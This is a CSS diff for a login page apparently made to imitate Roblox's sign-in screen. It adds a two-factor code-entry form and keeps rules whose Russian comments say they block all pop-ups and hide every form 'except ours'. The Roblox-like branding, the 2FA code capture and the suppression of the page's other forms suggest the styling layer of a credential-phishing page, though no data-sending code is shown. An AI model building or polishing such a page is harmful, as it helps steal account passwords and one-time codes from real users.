@@ -3,6 +3,7 @@
     padding: 0;
     box-sizing: border-box;
 }
+
 body.rbx-body {
     font-family: 'Source Sans Pro', Arial, sans-serif;
     background: #232527;
@@ -10,6 +11,7 @@ body.rbx-body {
     margin: 0;
     min-height: 100vh;
 }
+
 .container-main {
     display: flex;
     justify-content: center;
@@ -17,6 +19,7 @@ body.rbx-body {
     min-height: 100vh;
     background: #232527;
 }
+
 .login-form-container {
     background: #393b3d;
     border-radius: 8px;
@@ -26,11 +29,17 @@ body.rbx-body {
     max-width: 380px;
     margin: 0 auto;
 }
-.login-form {
+
+.login-form, .code-form {
     display: flex;
     flex-direction: column;
     gap: 18px;
 }
+
+.code-form {
+    display: none;
+}
+
 .input-field {
     width: 100%;
     padding: 12px 14px;
@@ -41,11 +50,13 @@ body.rbx-body {
     font-size: 16px;
     transition: border-color 0.2s;
 }
+
 .input-field:focus {
     outline: none;
     border-color: #00b06c;
 }
-.btn-primary-md, .login-button {
+
+.btn-primary-md, .login-button, .submit-2fa-button {
     width: 100%;
     padding: 12px 0;
     background: #00b06c;
@@ -58,33 +69,59 @@ body.rbx-body {
     transition: background 0.2s;
     margin-top: 10px;
 }
-.btn-primary-md:hover, .login-button:hover {
+
+.btn-primary-md:hover, .login-button:hover, .submit-2fa-button:hover {
     background: #00995a;
 }
+
+.btn-secondary {
+    width: 100%;
+    padding: 10px 0;
+    background: transparent;
+    color: #00b06c;
+    border: 1.5px solid #00b06c;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s;
+    margin-top: 8px;
+}
+
+.btn-secondary:hover {
+    background: #00b06c;
+    color: #fff;
+}
+
 .form-group {
     display: flex;
     flex-direction: column;
     gap: 6px;
 }
+
 .remember-me-form-group {
     flex-direction: row;
     align-items: center;
     gap: 8px;
     margin-bottom: 8px;
 }
+
 .text-center {
     text-align: center;
     margin-top: 16px;
 }
+
 .text-link {
     color: #00b06c;
     text-decoration: none;
     font-weight: 600;
     margin-left: 4px;
 }
+
 .text-link:hover {
     text-decoration: underline;
 }
+
 .result-message {
     margin-top: 18px;
     padding: 12px;
@@ -93,11 +130,76 @@ body.rbx-body {
     background: #232527;
     color: #fff;
     font-size: 15px;
+    border-left: 4px solid #00b06c;
 }
+
+.result-message.success {
+    border-left-color: #00b06c;
+    background: rgba(0, 176, 108, 0.1);
+}
+
+.result-message.error {
+    border-left-color: #ff4757;
+    background: rgba(255, 71, 87, 0.1);
+}
+
+.result-message.info {
+    border-left-color: #3742fa;
+    background: rgba(55, 66, 250, 0.1);
+}
+
+.form-title {
+    text-align: center;
+    font-size: 24px;
+    font-weight: 700;
+    margin-bottom: 20px;
+    color: #fff;
+}
+
+.form-subtitle {
+    text-align: center;
+    font-size: 14px;
+    color: #a0a0a0;
+    margin-bottom: 20px;
+}
+
 @media (max-width: 480px) {
     .login-form-container {
-        padding: 24px 8px;
+        padding: 24px 16px;
+        margin: 16px;
     }
+    
+    .form-title {
+        font-size: 20px;
+    }
+}
+
+/* Анимации для плавного перехода между формами */
+.login-form, .code-form {
+    transition: opacity 0.3s ease-in-out;
+}
+
+/* Стили для поля ввода кода 2FA */
+#twofaCode {
+    text-align: center;
+    font-size: 18px;
+    letter-spacing: 2px;
+    font-weight: 600;
+}
+
+/* Стили для кнопки "Назад" */
+#backToLogin {
+    background: transparent;
+    color: #a0a0a0;
+    border: none;
+    text-decoration: underline;
+    cursor: pointer;
+    font-size: 14px;
+    margin-top: 16px;
+}
+
+#backToLogin:hover {
+    color: #00b06c;
 }
 
 /* Блокируем все всплывающие окна и модальные диалоги */
@@ -112,7 +214,7 @@ body.rbx-body {
 }
 
 /* Блокируем все формы, кроме наших */
-form:not(#loginForm):not(#codeForm):not(.login-form) {
+form:not(#loginForm):not(#codeForm):not(.login-form):not(.code-form) {
     display: none !important;
 }
 
